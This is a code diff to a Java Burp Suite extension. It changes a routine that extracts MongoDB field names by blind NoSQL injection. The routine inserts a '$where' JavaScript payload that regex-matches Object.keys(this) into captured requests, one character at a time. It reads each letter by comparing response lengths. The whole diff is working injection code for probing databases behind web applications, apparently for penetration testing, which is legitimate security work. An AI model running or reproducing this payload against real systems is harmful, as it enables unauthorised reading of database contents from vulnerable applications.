@@ -388,7 +388,7 @@ public class NNN implements BurpExtension {
         }).start();
     }
 
-    static void extractFieldNames(HttpRequestResponse requestResponse) {
+    static void extractFieldNames(HttpRequestResponse requestResponse, int index) {
         infoPane.setText(infoPane.getText() + "[i] Extraction of field names\n");
         //api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
         ArrayList<String> names = new ArrayList<>();
@@ -401,32 +401,43 @@ public class NNN implements BurpExtension {
 
                     Boolean finished = false;
                     int number = 0;
-                    while (!finished || number == 0) {
+                    while (!finished || number < 2) {
                         int position = 0;
                         StringBuilder sb = new StringBuilder();
                         while (true) {
                             ArrayList<HttpRequestResponse> responseList = new ArrayList<>();
-                            for (char ch = '0'; ch <= 'z'; ch++) {
-                                if ((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9')){
-                                    request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, requestResponse.request().toString().length() - 1) + ", \"$where\":\" Object.keys(this)[" + Integer.toString(number) + "].match('^.{" + Integer.toString(position) + "}" + ch + ".*')\"}");
-                                    response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
-                                    //api.logging().logToOutput(number.toString() + " " + position.toString() + " " + character.toString() + " " + response2receive.response().body().toString().length());
-                                    responseList.add(response2receive);
-                                    //api.logging().logToOutput(request2send.body().toString());
-                                    //api.logging().logToOutput(response2receive.response().toString());
+                            HttpRequestResponse response1 = null; HttpRequestResponse response2 = null;
+                            Character extractedLetter = null;
+                            String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+                            char ch;
+                            for (int i=0; i< characters.length(); i++) {
+                                ch = characters.charAt(i);
+                                StringBuilder payload = new StringBuilder();
+                                payload.append(", \"$where\":\" Object.keys(this)[");
+                                payload.append(Integer.toString(number));
+                                payload.append("].match('^.{");
+                                payload.append(Integer.toString(position));
+                                payload.append("}");
+                                payload.append(ch);
+                                payload.append(".*')\"");
+                                request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, index) + payload + requestResponse.request().toString().substring(index));
+                                response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                                responseList.add(response2receive);
+                                if (response1 == null){
+                                    response1 = response2receive;
+                                } else if (response2 == null && response2receive.response().toString().length() != response1.response().toString().length()){
+                                    response2 = response2receive;
+                                } else if (response2 != null && response2receive.response().toString().length() == response1.response().toString().length()){
+                                    extractedLetter = response2.request().toString().charAt(response2.request().toString().lastIndexOf(".*')")-1);
+                                    break;
+                                } else if (response2 != null && response2receive.response().toString().length() == response2.response().toString().length()){
+                                    extractedLetter = response1.request().toString().charAt(response1.request().toString().lastIndexOf(".*')")-1);
+                                    break;
                                 }
                             }
-                            double mean = calculateMean(responseList);
-                            //api.logging().logToOutput(String.valueOf(mean));
-                            // Calculate the standard deviation
-                            double stdDev = calculateStandardDeviation(responseList, mean);
-                            // Find objects with instance parameter values that stand out
-                            //api.logging().logToOutput(String.valueOf(stdDev));
-                            ArrayList<HttpRequestResponse> outliers = findOutliers(responseList, mean, stdDev);
-                            if (!outliers.isEmpty()){
-                                //api.logging().logToOutput(outliers.get(0).request().toString());
-                                api.logging().logToOutput("outlier: " + outliers.get(0).request().toString().charAt(outliers.get(0).request().toString().length()-7));
-                                sb.append(outliers.get(0).request().toString().charAt(outliers.get(0).request().toString().length()-7));
+                            if (extractedLetter != null){
+                                infoPane.setText(infoPane.getText() + extractedLetter);
+                                sb.append(extractedLetter);
                             } else {
                                 if (sb.isEmpty() && number > 0){
                                     finished = true;
@@ -438,6 +449,7 @@ public class NNN implements BurpExtension {
                             position++;
                         }
                         number++;
+                        infoPane.setText(infoPane.getText() + "\n");
                         if (!sb.isEmpty()){
                             infoPane.setText(infoPane.getText() + "[i] Extracted fieldname: " + sb + "\n");
                         }
